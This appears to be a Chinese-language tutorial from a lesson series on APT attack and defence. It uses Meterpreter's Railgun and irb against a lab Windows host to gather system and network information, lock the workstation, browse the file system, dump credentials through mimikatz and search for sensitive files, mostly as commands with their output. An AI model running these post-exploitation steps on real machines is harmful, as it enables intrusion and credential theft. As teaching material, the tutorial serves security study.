



# 专注APT攻击与防御
https://micropoor.blogspot.com/

**Railgun是Meterpreter stdapi的扩展，允许任意加载DLL。Railgun的最大好处是能够动态访问系统上的整个Windows API。通过从用户进程调用Windows API。**
![](media/3887a1136b060d02cc820deceb0610c5.jpg)

meterpreter下执行irb进入ruby交互。

基本的信息搜集：
```bash
>> client.sys.config.sysinfo['OS']
=> "Windows .NET Server (Build 3790, Service Pack 2)."
>> client.sys.config.getuid
=> "WIN03X64\\Administrator"
>> interfaces = client.net.config.interfaces
=>[#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr="\x00\f)\x85\xD6}", @mac_name="Inte l(R) PRO/1000 MT Network Connection", @mtu=1500, @flags=nil, @addrs=["19 2.168.1.119"], @netmasks=["255.255.255.0"], @scopes=[]>, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1,@mac_addr="", @mac_name="MS TCP Loopback interface", @mtu=1520, @flags=ni l,@addrs=["127.0.0.1"], @netmasks=[], @scopes=[]>]
>> interfaces.each do |i|
?> puts i.pretty
>> end

Interface 65539
 ============
Name : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:85:d6:7d
MTU : 1500
IPv4 Address : 192.168.1.119
IPv4 Netmask : 255.255.255.0
Interface 1
 ============
Name : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU : 1520
IPv4 Address : 127.0.0.1
=>[#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5770 @index=65539, @mac_addr="\x00\f)\x85\xD6}", @mac_name="Inte l(R) PRO/1000 MT Network Connection", @mtu=1500, @flags=nil, @addrs=["19 2.168.1.119"], @netmasks=["255.255.255.0"], @scopes=[]>, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Interface:0x000055aee92c5220 @index=1, @mac_addr="", @mac_name="MS TCP Loopback interface", @mtu=1520, @flags=ni l, @addrs=["127.0.0.1"], @netmasks=[], @scopes=[]>]
>> 
```
![](media/c699d8499e9ccc7e52378c7a4aab8b16.jpg)

锁定注销目标机：
```bash
>> client.railgun.user32.LockWorkStation()
=> {"GetLastError"=>0, "ErrorMessage"=>"\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3", "return"=>true}
>> 
```
![](media/16c29aa470deb87ea1321eecf1cf97b3.jpg)

调用MessageBox：
```bash
>> client.railgun.user32.MessageBoxA(0, "Micropoor", "Micropoor", "MB_OK")
```
![](media/f2fa18b3dd40787d8cff662aa133adb6.jpg)



快速获取当前绝对路径：
```bash
>> client.fs.dir.pwd
=> "C:\\Documents and Settings\\Administrator\\\xE6\xA1\x8C\xE9\x9D\xA 2"
```

目录相关操作：
```bash
>> client.fs.dir.chdir("c:\\")
=> 0
>> client.fs.dir.entries
=> ["ADFS", "AUTOEXEC.BAT", "boot.ini", "bootfont.bin", "CONFIG.SYS", "Documents and Settings", "Inetpub", "IO.SYS", "MSDOS.SYS", "NTDETECT.CO M", "ntldr", "pagefile.sys", "Program Files", "Program Files (x86)", "RECYCLER", "System Volume Information", "WINDOWS", "wmpub"]
```

建立文件夹：
```bash
>> client.fs.dir.mkdir("Micropoor")
=> 0 
```
![](media/bf1667163d90cf5139ce06d51c5e0d76.jpg)

hash操作：
```bash
>> client.core.use "mimikatz"
=> true
>> client.mimikatz
=> #<Rex::Post::Meterpreter::Extensions::Mimikatz::Mimikatz:0x000055aee91ceb28 @client=#<Session:meterpreter 192.168.1.119:53 (192.168.1.119) "WIN03X64\Administrator @ WIN03X64">, @name="mimikatz">
>> client.mimikatz.kerberos
=>[{:authid=>"0;996", :package=>"Negotiate", :user=>"NETWORKSERVICE", :domain=>"NT AUTHORITY", :password=>"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"},{:authid=>"0;44482", :package=>"NTLM", :user=>"", :domain=>"",:password=>"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B \x02 \nn.a. (kerberos KO)"}, {:authid=>"0;115231",:package=\>"NTLM", :user=>"Administrator", :domain=>"WIN03X64",:password=>"mod_process::getVery BasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadPocessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"}, {:a uthid=>"0;997",:package=>"Negotiate", :user=>"LOCAL SERVICE", :domain=>"NT AUTHORITY",:password=>"mod_process::getVeryBasicModulesList ForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"}, {:authid=>"0;999", package=>"NTLM",
:user=>"WIN03X64$", :domain=>"WORKGROUP", :password=>"mod_process::getVeryBasicModulesListForProcess : (0x0000012b) \xC5\x8C\x10\xE8\x06\x84 ReadProcessMemory \x16 WriteProcessMemory \xF7B\x02 \nn.a. (kerberos KO)"}]
```
![](media/a03610b1b7f3c56a8905319c9f8ce20f.jpg)

内网主机发现，如路由，arp等：
```bash
>> client.net.config.arp_table
=> [#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5f6b8 @ip_addr="192.168.1.1", @mac_addr="78:44:fd:8e:91:59", @interface="65539">, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Arp:0x000055aee7f5ee20 @ip_addr="192.168.1.3", @mac_addr="28:16:ad:3b:51:78", @inteface="65539">]
>> client.net.config.arp_table[0].ip_addr
>> => "192.168.1.1"
>> client.net.config.arp_table[0].mac_addr
=> "78:44:fd:8e:91:59"
>> client.net.config.arp_table[0].interface
=> "65539"
>> client.net.config.routes
=> [#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee789be58 @subnet="0.0.0.0", @netmask="0.0.0.0", @gateway="192.168.1.1",
@interface="65539", @metric=10>,#<Rex::Post::Meterpreter::Extensions::St
dapi::Net::Route:0x000055aee789a7b0 @subnet="127.0.0.0", @netmask="255.0.0.0", @gateway="127.0.0.1", @interface="1", @metric=1>, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee78993b0 \@subnet="192.168.1.0", @netmask="255.255.255.0", @gateway="192.168.1.119", @interface="65539", @metric=10>, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786fec0 @subnet="192.168.1.119", @netmask="255.255.255.255", @gateway="127.0.0.1", @interface="1", @metric=10>,#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786e9d0 @subnet="192.168.1.255", @netmask="255.255.255.255", @gateway="192.168.1.119", @inte
rface="65539", @metric=10>, #<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee786d698 @subnet="224.0.0.0", @netmask="240.0.0.0", @gateway="192.168.1.119", @interface="65539", @metric=10>,#<Rex::Post::Meterpreter::Extensions::Stdapi::Net::Route:0x000055aee785be98 @subnet="255.255.255.255", @netmask="255.255.255.255", @gateway="192.168.1.119",
@interface="65539", @metric=1>]
```
![](media/117133f26378e67253fb7e0e6fbb8dc3.jpg)

**实战中的敏感文件操作，也是目前最稳定，速度最快的方式：**
```bash
>> client.fs.file.search("C:\\", "*.txt")
```

更多的敏感文件操作，后续补充。
![](media/f9b76bce304c8f9f4f75d6db4deaccd4.jpg)

更多相关的api操作在未来的课时中介绍。

>   Micropoor
